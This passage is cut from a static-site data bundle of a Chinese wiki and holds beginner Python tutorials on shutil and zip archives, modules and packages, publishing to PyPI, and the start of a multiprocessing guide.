拷贝和压缩\n\nshutil是python标准库提供的用于文件和文件夹拷贝移动删除等，还可以用于文件的压缩和解压缩操作。\n\nos模块提供了对于目录和文件的一般操作，shutil模块作为补充，提供了移动压缩复制解压缩等操作。\n\n文件拷贝操作：\n\nimport shutil\nshutil.copy("helloworld.txt","helloworld1.txt")\n\n# 递归拷贝\nshutil.copytree("../","hello",ignore=shutil.ignore_patterns("*.html","*.ser"))\n\n\n\n1\n2\n3\n4\n5\n6\n\n\n压缩和解压缩操作：\n\n# 文件压缩\nimport shutil\nimport zipfile\n\n# 将当前文件夹的内容压缩生成code.zip放到上一级文件夹中\n# shutil.make_archive("../code","zip","./")\n\nz = zipfile.zipfile("a.zip","w")\nz.write("hello.csv")\nz.write("haha.ser")\nz.close()\n\n# 解压缩\nz2 = zipfile.zipfile("a.zip","r")\nz2.extractall("../hello")\nz2.close()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Python模块化的那些事",frontmatter:{title:"Python模块化的那些事",date:"2022-03-27T22:00:00.000Z",permalink:"/sec/dev/python/module",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/07.Python%E6%A8%A1%E5%9D%97%E5%8C%96%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.安全/202.安全开发/2020.Python/07.Python模块化的那些事.md",key:"v-aee8137e",path:"/sec/dev/python/module/",headers:[{level:2,title:"Python模块化简介",slug:"python模块化简介",normalizedTitle:"python模块化简介",charIndex:97},{level:2,title:"导入模块",slug:"导入模块",normalizedTitle:"导入模块",charIndex:693},{level:3,title:"import导入模块",slug:"import导入模块",normalizedTitle:"import导入模块",charIndex:1277},{level:3,title:"from import导入",slug:"from-import导入",normalizedTitle:"from import导入",charIndex:1984},{level:3,title:"import 和 from import的区别",slug:"import-和-from-import的区别",normalizedTitle:"import 和 from import的区别",charIndex:2216},{level:3,title:"__import__()动态导入",slug:"import-动态导入",normalizedTitle:"<strong>import</strong>()动态导入",charIndex:null},{level:3,title:"模块的加载",slug:"模块的加载",normalizedTitle:"模块的加载",charIndex:2506},{level:3,title:"动态加载",slug:"动态加载",normalizedTitle:"动态加载",charIndex:2593},{level:2,title:"package 包",slug:"package-包",normalizedTitle:"package 包",charIndex:2709},{level:3,title:"导入包",slug:"导入包",normalizedTitle:"导入包",charIndex:2870},{level:3,title:"导入星包",slug:"导入星包",normalizedTitle:"导入星包",charIndex:3446},{level:3,title:"包内引用",slug:"包内引用",normalizedTitle:"包内引用",charIndex:3643},{level:3,title:"sys.path和模块的搜索路径",slug:"sys-path和模块的搜索路径",normalizedTitle:"sys.path和模块的搜索路径",charIndex:3726},{level:2,title:"模块的发布和安装",slug:"模块的发布和安装",normalizedTitle:"模块的发布和安装",charIndex:4154},{level:3,title:"本地安装模块",slug:"本地安装模块",normalizedTitle:"本地安装模块",charIndex:4690},{level:3,title:"上传到PyPI",slug:"上传到pypi",normalizedTitle:"上传到pypi",charIndex:4822},{level:3,title:"使用他人的模块",slug:"使用他人的模块",normalizedTitle:"使用他人的模块",charIndex:5200},{level:2,title:"库",slug:"库",normalizedTitle:"库",charIndex:414},{level:3,title:"Python标准库",slug:"python标准库",normalizedTitle:"python标准库",charIndex:483},{level:3,title:"第三方库",slug:"第三方库",normalizedTitle:"第三方库",charIndex:3872}],headersStr:"Python模块化简介 导入模块 import导入模块 from import导入 import 和 from import的区别 __import__()动态导入 模块的加载 动态加载 package 包 导入包 导入星包 包内引用 sys.path和模块的搜索路径 模块的发布和安装 本地安装模块 上传到PyPI 使用他人的模块 库 Python标准库 第三方库",content:'# Python模块化的那些事\n\n随着程序的越来越复杂，对于代码的管理显得至关重要。Python中对于代码的管理是基于模块和包实现的。这一篇就整理一下关于Python模块化的简单用法。\n\n\n# Python模块化简介\n\nPython程序是由模块组成的，一个模块就对应了一个Python文件。而模块是由语句组成的，运行Python程序时，按照模块中的语句的顺序执行代码。语句是Python程序的构造单元，主要用于创建对象、给变量赋值、调用函数、控制语句等等。\n\n模块化编程对于Python而言至关重要，模块中可以定义变量函数、类、普通语句等。我们可以将一个复杂的Python程序分解为多个模块，便于后期的重用和调用。模块化编程有下面的几个优势：\n\n 1. 便于将一个任务分解为多个模块，实现团队内部的协同开发，完成大规模程序\n 2. 实现代码的复用，一个模块可以被反复多次调用\n 3. 可维护性较强\n\nPython中提供了一个标准库模块，包括提供了操作系统功能、网络通信、文本处理、文件处理、数学运算等等。同时Python的使用者还开开源了大量的第三方模块，使用方法和Python标准库类似。功能覆盖了方方面面。\n\n模块化编程的基本流程\n\n 1. 设计API，进行功能的描述\n 2. 编码实现API中描述的功能\n 3. 编写测试代码，并消除全局代码\n 4. 使用私有函数是心啊不被外部客户端调用的函数模块函数\n\n模块化编程中，最重要的就是要先设计出模块的API，然后开始编写代码，实现API中描述的功能，最后，在其他模块中导入本模块进行调用。我们通过help查看模块的API，一般使用时先导入模块，然后通过help函数查看。\n\n"""\n本模块用于计算员工的工资\n"""\n\ncompany = "sgg"\ndef yearSalary(monthSalary):\n    """根据传入的月薪计算年薪"""\n    pass\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n每个模块都有一个名称，通过特殊变量__name__可以获取模块的名称，在正常情况之下，模块的名称对应着源文件名，但是，如果当一个模块被当作程序的入口时，其名称为__main__。我们可以根据这个特点，将模块源代码文件中的测试代码进行对立处理。\n\n"""\n本模块用于计算员工的工资\n"""\n\ncompany = "sgg"\ndef yearSalary(monthSalary):\n    """根据传入的月薪计算年薪"""\n    pass\n\n\n# 测试代码可以这样写\nif __name__ == "__main__":\n    print("hello")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n我们可以在模块的第一行添加一个文档字符串，用于描述模块的相关功能，然后使用__doc__可以获取文档字符串的内容。\n\n\n# 导入模块\n\n模块设计的好处之一就是使代码的复用性变高，写好的模块可以被任意的反复的调用。模块的导入就是在本模块中使用其他的模块。\n\n\n# import导入模块\n\nimport 可以直接导入一个或多个模块，并可以给导入的模块重命名。在使用import加载模块时分为四个类别：\n\n 1. 使用Python编写的代码\n 2. 已经被编译为共享库或者ddl的c或C++扩展\n 3. 一个一组模块的包\n 4. 使用c编写并链接到python中的内置的模块\n\n我们一般通过import语句实现模块的导入和使用，import语句实际上是使用了内置函数__import__()。当我们通过import导入一个模块时，Python解释器进行执行，并声称一个对象，这个对象就代表了被加载的模块。\n\nimport math\nprint(id(math)) # 140277795567584\nprint(type(math)) # <class \'module\'>\nprint(math.pi) # 3.141592653589793\n\n\n1\n2\n3\n4\n\n\n当我们导入了一个模块的时候，会生成一个module的类的对象，该对象呗math变量引用，可以通过math变量去访问和引用模块中的所有内容。我们通过import导入多个模块时，本质上也是生成了module的多个类对象而已。有时候，我们需要给模块起一个别名，本质上，这个别名仅仅是新创建一个变量替代默认的变量名引用module对象而已。\n\nimport math,os\nprint(type(os)) # <class \'module\'>\nprint(type(math)) # <class \'module\'>\n\nimport math as m\n\nprint(m.pi)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# from import导入\n\nPython中可以使用from import导入模块中的成员，导入的格式如下：\n\nfrom 模块名 import 成员1，成员2\t\n\n\n1\n\n\n如果希望导入一个模块中的所有成员，则可以采用导入星号的方法：from 模块名 import *\n\n但是应该尽量的去避免这种写法，因为星号代表的是导入模块中所有非下划线开头的名称，到那时如果你不知道你导入的模块中有哪些名字，就可能覆盖掉你自己的定义的变量，导致可读性变差，排错困难。\n\n\n# import 和 from import的区别\n\nimport导入的是模块，而from import导入的是模块中的一个函数或者一个类。\n\n可以简单的理解的话，import导入的是一个文件，而from import导入的是这个文件下的内容。如果使用import导入的话，就需要使用文件名称调用具体的文件里面的内容。\n\n\n# __import__()动态导入\n\nimport本质上是调用的内置的函数__import__(),我们可以通过它实现动态导入。__import__()动态传递不通参数值，就能导入不通的模块。一般我们不建议自行使用__import__()进行导入。\n\n\n# 模块的加载\n\n当一个模块被导入时，模块中的代码就会被执行，如果再次导入这个模块则不会再次执行。一个模块无论导入了多少次，这个模块在整个进程中，有且只有一个实例对象。\n\n\n# 动态加载\n\n有时候我们确实需要重新加载一个模块，则可以使用：importlib.reload()方法。\n\nimport calc_salary\n\nimportlib.reload(calc_salary)\n\n\n1\n2\n3\n\n\n\n# package 包\n\n当一个项目中存在多个模块的时候，就需要再次进行组织，我们将具有相同功能的类似的模块放到一起，形成了一个包，一个包必须要包含一个__init__.py的文件，包中可以包含模块，也可以包含子包。\n\n在Pycharm中创建包时，Pycharm会自动帮我生成一个带有__init__.py的文件夹。\n\n\n# 导入包\n\n当我们需要导入某个aa包下的moduleAA模块时，需要以下方法：\n\n 1. Import aa.moduleAA\n    \n    在使用时，需要完整的名称来引用：aa.moduleAA.func()\n\n 2. from aa import moduleAA\n    \n    在使用时，可以直接使用模块名：moduleAA.func()\n\n 3. from aa.moduleAA import func\n    \n    在使用时可以直接使用函数名：func()\n\n导入包的本质是导入了包中的__init__.py文件，也就是说，导入了import pack1就是导入并执行了pack1包下的__init__.py文件。这样，我们就可以在__init__()模块中批量导入我们需要的模块，不需要一一导入。\n\n__init__.py的三个作用：\n\n 1. 识别包\n 2. 实现模糊导入\n 3. 包初始化，统一导入代码、批量导入\n\ntest包下的__init__.py\n\nimport turtle\nimport math\n\nprint("导入了test包")\n\n\n1\n2\n3\n4\n\n\n在demo包中导入了test包，并使用test包中导入的math\n\nimport test\nprint(test.math.pi)\n\n\n1\n2\n\n\n\n# 导入星包\n\nimport *理论上文件系统可以找出所有的子模块，并进行导入。但是这回花费大量的时间。Python提供了一种包索引的方式。\n\n这个索引可以在__imit__.py文件中定义一个__all__变量，并将对应包下的所有的模块作为列表内容存入到__all__中，这样，使用from test import *导入的就是__all__列表中的所有模块了。但是仍然不建议这样导入。\n\n\n# 包内引用\n\n如果是子包内的引用，可以按照相应的位置引入子模块：\n\nfrom . import calc\nfrom .. import demo\n\n\n1\n2\n\n\n\n# sys.path和模块的搜索路径\n\n当我们导入某个模块文件时，Python的解释器是如何寻找这个文件并加载的呢？一般按照如下的顺序寻找，如果最后找不到就会报错：\n\n 1. 内置模块\n 2. 当前目录\n 3. 当前程序的主目录\n 4. pythonpath目录\n 5. 标准链接库目录\n 6. 第三方库目录site-packages\n 7. .pth文件的内容\n 8. sys.path.append()添加的临时目录\n\n当任何一个python程序启动的时候，都会按照上面的路径搜索收集，并放到sys模块的path属性中。\n\n我们可以通过代码往sys.path中添加内容：\n\nimport sys\nsys.path.append("/")\n\n\n1\n2\n\n\n\n\nPythonpath通过添加环境变量设置\n\n.pth文件，可以在site-packages目录下添加如下的内容：\n\n# 一行写一个\n/aaa/aa/a\n/bbb/bb/b\n\n\n1\n2\n3\n\n\n\n# 模块的发布和安装\n\n当我们完成某个模块的开发后，可以将其对外发布，其他开发着可以以第三方扩展库的方式使用我们的模块。模块的发布步骤如下：\n\n 1. 为模块创建如下的结构文件夹，一般情况下文件夹的名字和模块名字一致；\n\n\n\n 2. 在文件夹中创建一个setup.py文件，文件内容如下：\n    \n    setup(\n    \n    # 对外我们模块的名字\n    name=\'\', version=\'1.0\', # 版本号 description=\'这是第一个对外发布的模块，测试哦\',\n    author=\'\', # 作者\n    #描述\n    author_email=\'aaa@163.com\', py_modules=[\'baizhanMath2.demo1\',\'baizhanMath2.demo2\'] # 要发布的模块\n    )\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 3. 构建一个发布文件，执行python setup.py sdist命令。\n\n 4. 执行完成之后，文件目录下生成了一个dist文件夹，里面生成了一个发布包。\n    \n    \n\n\n# 本地安装模块\n\n将发布安装到本地的计算机上，只需要执行如下的命令即可：\n\npython setup.py install\n\n\n1\n\n\n安装完成之后，会在python目录下的lib下的site-packages目录下保存。后面直接使用import导入即可。\n\n\n# 上传到PyPI\n\n可以将自己开发的模块上传到PyPI上，可以让全球的开发者自由使用。\n\n首先需要注册PyPI账号，https://pypi.python.org\n\n然后创建用户信息文件 .pypirc\n\n# 方式一：Linux\npython setup.py register\n\n# 方式二：windows Linux\n在家目录下创建.pypirc\n[distutils] index-servers=pypi\n\n[pypi] repository = https://upload.pypi.org/legacy/ username = 账户名 password = 你自己的密码\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n然后进入setup.py所在的目录，使用python setup.py sdist upload即可将模块代码上传并发布。\n\n\n# 使用他人的模块\n\n模块发布完成之后，别人要使用，只需要输入：pip install package-name即可安装模块。\n\n如果更新了模块，也可以使用pip install package-name update更新。\n\n\n# 库\n\nPython中的库是借用其他语言的概念，并没有具体的定义，模块和包侧重于代码的组织。一般情况下，库强调的是功能性，我们通常讲功能模块的集合称为库。\n\n\n# Python标准库\n\nPython中有一个强大的标准库。Python 语言的核心只包含数字、字符串、列表、字典、 文件等常见类型和函数，而由 Python 标准库提供了系统管理、网络通信、文本处理、数据 库接口、图形系统、XML 处理等额外的功能。\n\n\n# 第三方库\n\nPython之所以流行，是因为有很多强大的第三方库，我们可以在https://pypi.org上搜索需要的第三方库。',normalizedContent:'# python模块化的那些事\n\n随着程序的越来越复杂，对于代码的管理显得至关重要。python中对于代码的管理是基于模块和包实现的。这一篇就整理一下关于python模块化的简单用法。\n\n\n# python模块化简介\n\npython程序是由模块组成的，一个模块就对应了一个python文件。而模块是由语句组成的，运行python程序时，按照模块中的语句的顺序执行代码。语句是python程序的构造单元，主要用于创建对象、给变量赋值、调用函数、控制语句等等。\n\n模块化编程对于python而言至关重要，模块中可以定义变量函数、类、普通语句等。我们可以将一个复杂的python程序分解为多个模块，便于后期的重用和调用。模块化编程有下面的几个优势：\n\n 1. 便于将一个任务分解为多个模块，实现团队内部的协同开发，完成大规模程序\n 2. 实现代码的复用，一个模块可以被反复多次调用\n 3. 可维护性较强\n\npython中提供了一个标准库模块，包括提供了操作系统功能、网络通信、文本处理、文件处理、数学运算等等。同时python的使用者还开开源了大量的第三方模块，使用方法和python标准库类似。功能覆盖了方方面面。\n\n模块化编程的基本流程\n\n 1. 设计api，进行功能的描述\n 2. 编码实现api中描述的功能\n 3. 编写测试代码，并消除全局代码\n 4. 使用私有函数是心啊不被外部客户端调用的函数模块函数\n\n模块化编程中，最重要的就是要先设计出模块的api，然后开始编写代码，实现api中描述的功能，最后，在其他模块中导入本模块进行调用。我们通过help查看模块的api，一般使用时先导入模块，然后通过help函数查看。\n\n"""\n本模块用于计算员工的工资\n"""\n\ncompany = "sgg"\ndef yearsalary(monthsalary):\n    """根据传入的月薪计算年薪"""\n    pass\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n每个模块都有一个名称，通过特殊变量__name__可以获取模块的名称，在正常情况之下，模块的名称对应着源文件名，但是，如果当一个模块被当作程序的入口时，其名称为__main__。我们可以根据这个特点，将模块源代码文件中的测试代码进行对立处理。\n\n"""\n本模块用于计算员工的工资\n"""\n\ncompany = "sgg"\ndef yearsalary(monthsalary):\n    """根据传入的月薪计算年薪"""\n    pass\n\n\n# 测试代码可以这样写\nif __name__ == "__main__":\n    print("hello")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n我们可以在模块的第一行添加一个文档字符串，用于描述模块的相关功能，然后使用__doc__可以获取文档字符串的内容。\n\n\n# 导入模块\n\n模块设计的好处之一就是使代码的复用性变高，写好的模块可以被任意的反复的调用。模块的导入就是在本模块中使用其他的模块。\n\n\n# import导入模块\n\nimport 可以直接导入一个或多个模块，并可以给导入的模块重命名。在使用import加载模块时分为四个类别：\n\n 1. 使用python编写的代码\n 2. 已经被编译为共享库或者ddl的c或c++扩展\n 3. 一个一组模块的包\n 4. 使用c编写并链接到python中的内置的模块\n\n我们一般通过import语句实现模块的导入和使用，import语句实际上是使用了内置函数__import__()。当我们通过import导入一个模块时，python解释器进行执行，并声称一个对象，这个对象就代表了被加载的模块。\n\nimport math\nprint(id(math)) # 140277795567584\nprint(type(math)) # <class \'module\'>\nprint(math.pi) # 3.141592653589793\n\n\n1\n2\n3\n4\n\n\n当我们导入了一个模块的时候，会生成一个module的类的对象，该对象呗math变量引用，可以通过math变量去访问和引用模块中的所有内容。我们通过import导入多个模块时，本质上也是生成了module的多个类对象而已。有时候，我们需要给模块起一个别名，本质上，这个别名仅仅是新创建一个变量替代默认的变量名引用module对象而已。\n\nimport math,os\nprint(type(os)) # <class \'module\'>\nprint(type(math)) # <class \'module\'>\n\nimport math as m\n\nprint(m.pi)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# from import导入\n\npython中可以使用from import导入模块中的成员，导入的格式如下：\n\nfrom 模块名 import 成员1，成员2\t\n\n\n1\n\n\n如果希望导入一个模块中的所有成员，则可以采用导入星号的方法：from 模块名 import *\n\n但是应该尽量的去避免这种写法，因为星号代表的是导入模块中所有非下划线开头的名称，到那时如果你不知道你导入的模块中有哪些名字，就可能覆盖掉你自己的定义的变量，导致可读性变差，排错困难。\n\n\n# import 和 from import的区别\n\nimport导入的是模块，而from import导入的是模块中的一个函数或者一个类。\n\n可以简单的理解的话，import导入的是一个文件，而from import导入的是这个文件下的内容。如果使用import导入的话，就需要使用文件名称调用具体的文件里面的内容。\n\n\n# __import__()动态导入\n\nimport本质上是调用的内置的函数__import__(),我们可以通过它实现动态导入。__import__()动态传递不通参数值，就能导入不通的模块。一般我们不建议自行使用__import__()进行导入。\n\n\n# 模块的加载\n\n当一个模块被导入时，模块中的代码就会被执行，如果再次导入这个模块则不会再次执行。一个模块无论导入了多少次，这个模块在整个进程中，有且只有一个实例对象。\n\n\n# 动态加载\n\n有时候我们确实需要重新加载一个模块，则可以使用：importlib.reload()方法。\n\nimport calc_salary\n\nimportlib.reload(calc_salary)\n\n\n1\n2\n3\n\n\n\n# package 包\n\n当一个项目中存在多个模块的时候，就需要再次进行组织，我们将具有相同功能的类似的模块放到一起，形成了一个包，一个包必须要包含一个__init__.py的文件，包中可以包含模块，也可以包含子包。\n\n在pycharm中创建包时，pycharm会自动帮我生成一个带有__init__.py的文件夹。\n\n\n# 导入包\n\n当我们需要导入某个aa包下的moduleaa模块时，需要以下方法：\n\n 1. import aa.moduleaa\n    \n    在使用时，需要完整的名称来引用：aa.moduleaa.func()\n\n 2. from aa import moduleaa\n    \n    在使用时，可以直接使用模块名：moduleaa.func()\n\n 3. from aa.moduleaa import func\n    \n    在使用时可以直接使用函数名：func()\n\n导入包的本质是导入了包中的__init__.py文件，也就是说，导入了import pack1就是导入并执行了pack1包下的__init__.py文件。这样，我们就可以在__init__()模块中批量导入我们需要的模块，不需要一一导入。\n\n__init__.py的三个作用：\n\n 1. 识别包\n 2. 实现模糊导入\n 3. 包初始化，统一导入代码、批量导入\n\ntest包下的__init__.py\n\nimport turtle\nimport math\n\nprint("导入了test包")\n\n\n1\n2\n3\n4\n\n\n在demo包中导入了test包，并使用test包中导入的math\n\nimport test\nprint(test.math.pi)\n\n\n1\n2\n\n\n\n# 导入星包\n\nimport *理论上文件系统可以找出所有的子模块，并进行导入。但是这回花费大量的时间。python提供了一种包索引的方式。\n\n这个索引可以在__imit__.py文件中定义一个__all__变量，并将对应包下的所有的模块作为列表内容存入到__all__中，这样，使用from test import *导入的就是__all__列表中的所有模块了。但是仍然不建议这样导入。\n\n\n# 包内引用\n\n如果是子包内的引用，可以按照相应的位置引入子模块：\n\nfrom . import calc\nfrom .. import demo\n\n\n1\n2\n\n\n\n# sys.path和模块的搜索路径\n\n当我们导入某个模块文件时，python的解释器是如何寻找这个文件并加载的呢？一般按照如下的顺序寻找，如果最后找不到就会报错：\n\n 1. 内置模块\n 2. 当前目录\n 3. 当前程序的主目录\n 4. pythonpath目录\n 5. 标准链接库目录\n 6. 第三方库目录site-packages\n 7. .pth文件的内容\n 8. sys.path.append()添加的临时目录\n\n当任何一个python程序启动的时候，都会按照上面的路径搜索收集，并放到sys模块的path属性中。\n\n我们可以通过代码往sys.path中添加内容：\n\nimport sys\nsys.path.append("/")\n\n\n1\n2\n\n\n\n\npythonpath通过添加环境变量设置\n\n.pth文件，可以在site-packages目录下添加如下的内容：\n\n# 一行写一个\n/aaa/aa/a\n/bbb/bb/b\n\n\n1\n2\n3\n\n\n\n# 模块的发布和安装\n\n当我们完成某个模块的开发后，可以将其对外发布，其他开发着可以以第三方扩展库的方式使用我们的模块。模块的发布步骤如下：\n\n 1. 为模块创建如下的结构文件夹，一般情况下文件夹的名字和模块名字一致；\n\n\n\n 2. 在文件夹中创建一个setup.py文件，文件内容如下：\n    \n    setup(\n    \n    # 对外我们模块的名字\n    name=\'\', version=\'1.0\', # 版本号 description=\'这是第一个对外发布的模块，测试哦\',\n    author=\'\', # 作者\n    #描述\n    author_email=\'aaa@163.com\', py_modules=[\'baizhanmath2.demo1\',\'baizhanmath2.demo2\'] # 要发布的模块\n    )\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 3. 构建一个发布文件，执行python setup.py sdist命令。\n\n 4. 执行完成之后，文件目录下生成了一个dist文件夹，里面生成了一个发布包。\n    \n    \n\n\n# 本地安装模块\n\n将发布安装到本地的计算机上，只需要执行如下的命令即可：\n\npython setup.py install\n\n\n1\n\n\n安装完成之后，会在python目录下的lib下的site-packages目录下保存。后面直接使用import导入即可。\n\n\n# 上传到pypi\n\n可以将自己开发的模块上传到pypi上，可以让全球的开发者自由使用。\n\n首先需要注册pypi账号，https://pypi.python.org\n\n然后创建用户信息文件 .pypirc\n\n# 方式一：linux\npython setup.py register\n\n# 方式二：windows linux\n在家目录下创建.pypirc\n[distutils] index-servers=pypi\n\n[pypi] repository = https://upload.pypi.org/legacy/ username = 账户名 password = 你自己的密码\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n然后进入setup.py所在的目录，使用python setup.py sdist upload即可将模块代码上传并发布。\n\n\n# 使用他人的模块\n\n模块发布完成之后，别人要使用，只需要输入：pip install package-name即可安装模块。\n\n如果更新了模块，也可以使用pip install package-name update更新。\n\n\n# 库\n\npython中的库是借用其他语言的概念，并没有具体的定义，模块和包侧重于代码的组织。一般情况下，库强调的是功能性，我们通常讲功能模块的集合称为库。\n\n\n# python标准库\n\npython中有一个强大的标准库。python 语言的核心只包含数字、字符串、列表、字典、 文件等常见类型和函数，而由 python 标准库提供了系统管理、网络通信、文本处理、数据 库接口、图形系统、xml 处理等额外的功能。\n\n\n# 第三方库\n\npython之所以流行，是因为有很多强大的第三方库，我们可以在https://pypi.org上搜索需要的第三方库。',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Python多线程的那些事",frontmatter:{title:"Python多线程的那些事",date:"2022-03-28T09:00:00.000Z",permalink:"/sec/dev/python/thread",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/08.Python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.安全/202.安全开发/2020.Python/08.Python多线程的那些事.md",key:"v-3f2c56fd",path:"/sec/dev/python/thread/",headers:[{level:2,title:"进程",slug:"进程",normalizedTitle:"进程",charIndex:96},{level:3,title:"创建进程",slug:"创建进程",normalizedTitle:"创建进程",charIndex:235},{level:3,title:"继承Process方式创建进程",slug:"继承process方式创建进程",normalizedTitle:"继承process方式创建进程",charIndex:3966},{level:3,title:"进程池",slug:"进程池",normalizedTitle:"进程池",charIndex:4560},{level:3,title:"进程间的通信",slug:"进程间的通信",normalizedTitle:"进程间的通信",charIndex:7649},{level:2,title:"线程",slug:"线程",normalizedTitle:"线程",charIndex:9},{level:3,title:"_thread模块",slug:"thread模块",normalizedTitle:"_thread模块",charIndex:12531},{level:3,title:"threading模块",slug:"threading模块",normalizedTitle:"threading模块",charIndex:12435},{level:3,title:"线程共享全局变量",slug:"线程共享全局变量",normalizedTitle:"线程共享全局变量",charIndex:16929},{level:2,title:"锁",slug:"锁",normalizedTitle:"锁",charIndex:908},{level:3,title:"互斥锁",slug:"互斥锁",normalizedTitle:"互斥锁",charIndex:18039},{level:3,title:"死锁",slug:"死锁",normalizedTitle:"死锁",charIndex:929},{level:3,title:"线程同步",slug:"线程同步",normalizedTitle:"线程同步",charIndex:18278},{level:3,title:"生产者和消费者模式",slug:"生产者和消费者模式",normalizedTitle:"生产者和消费者模式",charIndex:21904},{level:3,title:"ThreadLocal",slug:"threadlocal",normalizedTitle:"threadlocal",charIndex:23157}],excerpt:'<h1 id="python多线程的那些事"><a class="header-anchor" href="#python多线程的那些事">#</a> Python多线程的那些事</h1>\n<p>多线程类似于同时执行多个不同程序，比如在唱歌的时候同时跳舞。Python中也提供了实现多线程的方式，这一篇一起来看一下Python中如何使用多线程。</p>\n',headersStr:"进程 创建进程 继承Process方式创建进程 进程池 进程间的通信 线程 _thread模块 threading模块 线程共享全局变量 锁 互斥锁 死锁 线程同步 生产者和消费者模式 ThreadLocal",content:"# Python多线程的那些事\n\n多线程类似于同时执行多个不同程序，比如在唱歌的时候同时跳舞。Python中也提供了实现多线程的方式，这一篇一起来看一下Python中如何使用多线程。\n\n\n# 进程\n\n程序编写完没有运行称之为程序。正在运行的代码就是进程。在Python3语言中，对多进程支持的是multiprocessing模块和subprocess模块。multiprocessing模块为在子进程中运行任务、通讯和共享数据，以及执行各种形式的同步提供支持。\n\n\n# 创建进程\n\nPython提供了用于处理多进程的包multiprocessing。借助这个包，可以轻松完成从单进程到并发执行的转换。multiprocessing支持子进程、通信和共享数据。语法格式如下：\n\nProcess（[group [, target [, name [, args [, kwargs]]]]]）\n# target 表示调用的对象\n# name为进程的名字\n# args 表示调用对象的参数\n# kargs 表示调用对象的字典\n# group 未使用 为None\n\n\n1\n2\n3\n4\n5\n6\n\n\n使用以上的构造函数，可以构造出一个Process对象，该对象有如下的几种实例方法：\n\n方法                描述\nis_alive()        如果p仍然运行，返回True\njoin（[timeout]）   等待进程p终止。Timeout是可选的超时期限，进程可以被链接无数次，但如果连接自身则会出错\nrun()             进程启动时运行的方法。默认情况下，会调用传递给Process构造函数的target。定义进程的另一种方法是继承Process类并重新实现run()函数\nstart()           启动进程，这将运行代表进程的子进程，并调用该子进程中的run()函数\nterminate()       强制终止进程。如果调用此函数，进程p将被立即终止，同时不会进行任何清理动作。如果进程p创建了它自己的子进程，这些进程将变为僵尸进程。使用此方法时需要特别小心。如果p保存了一个锁或参与了进程间通信，那么终止它可能会导致死锁或I/O损坏\n\n创建进程的示例代码：\n\nfrom multiprocessing import Process\n\ndef process_func():\n    print(\"子进程执行了\")\n    \nif __name__ == '__main__':\n    p = Process(target=process_func)\n    print(\"父进程执行\")\n    print(\"子进程即将执行\")\n    p.start()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n创建带参数的进程示例代码：\n\nfrom multiprocessing import Process\nimport os\nfrom time import sleep\n#创建子进程代码\ndef run_proc(name,age,**kwargs):\n    for i in range(5):\n        print('子进程运行中，参数name：%s,age:%d'%(name,age))\n        print('字典参数kwargs：',kwargs)\n        sleep(0.5)\n\nif __name__=='__main__':\n    print('主进程开始运行')\n    p=Process(target=run_proc,args=('test',18),kwargs={'m':23})\n    print('子进程将要执行')\n    p.start()\n    \n    \n\"\"\"\n主进程开始运行\n子进程将要执行\n子进程运行中，参数name：test,age:18\n字典参数kwargs： {'m': 23}\n子进程运行中，参数name：test,age:18\n字典参数kwargs： {'m': 23}\n子进程运行中，参数name：test,age:18\n字典参数kwargs： {'m': 23}\n子进程运行中，参数name：test,age:18\n字典参数kwargs： {'m': 23}\n子进程运行中，参数name：test,age:18\n字典参数kwargs： {'m': 23}\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nJoin的用法，join表示的等待一个进程结束运行。如果在主进程中调用了某个进程join方法，则会等子进程执行完成之后才会继续执行主进程。\n\nfrom multiprocessing import Process\nfrom time import sleep\ndef worker(interval):\n    print(\"work start\");\n    sleep(interval)\n    print(\"work end\");\n\nif __name__ == \"__main__\":\n    p = Process(target = worker, args = (3,))\n    p.start()\n    #等待进程p终止\n    p.join()\n    print(\"主进程结束!\")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\njoin中的参数可以添加一个超时时间，如果超过这个时间就不继续等待了。\n\nfrom multiprocessing import Process\nfrom time import sleep\ndef worker(interval):\n    print(\"work start\");\n    sleep(interval)\n    print(\"work end\");\n\nif __name__ == \"__main__\":\n    p = Process(target = worker, args = (5,))\n    p.start()\n    #等待进程p终止\n    p.join(3)\n    print(\"主进程结束!\")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nProcess对象的实例属性如下表所示：\n\n属性     描述\nname   进程的名称\npid    进程的整数进程ID\n\n示例代码：\n\n#导入模块\nimport multiprocessing\nimport time\n#定义进程执行函数\ndef clock(interval):\n    for i in range(5):\n        print('当前时间为{0}：'.format(time.ctime()))\n        time.sleep(interval)\nif __name__=='__main__':\n    #创建进程\n    p=multiprocessing.Process(target=clock,args=(1,))\n    #启动进程\n    p.start()\n    p.join()\n    #获取进程的ID\n    